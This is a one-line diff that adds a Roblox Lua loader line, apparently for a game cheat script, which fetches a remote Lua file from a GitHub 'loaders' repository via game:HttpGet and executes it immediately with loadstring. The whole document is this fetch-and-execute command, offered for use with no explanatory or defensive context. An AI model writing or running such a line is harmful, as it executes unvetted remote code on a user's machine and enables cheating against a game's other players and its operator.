@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/rally-wrong-way-spam1-fclghh44e0cco0.lua"))()
